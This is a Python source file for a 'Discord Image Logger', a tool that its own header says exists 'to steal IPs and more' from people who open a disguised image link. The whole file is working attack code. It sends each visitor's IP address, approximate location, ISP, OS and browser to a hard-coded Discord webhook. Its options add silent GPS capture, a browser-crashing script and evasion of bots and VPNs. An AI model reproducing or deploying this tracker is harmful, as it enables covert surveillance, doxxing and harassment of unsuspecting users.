# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1364364360549535774/0ajGsL5jXxa_g0UCMh5R64_3i7zxtbotmgYwMhstvw6KwBE9O_JYkEjH4SeOfRwesdxt",
    "image": "data:image/jpeg;base64,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?format=jpg&crop=4560,2565,x790,y784,safe&width=1200", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
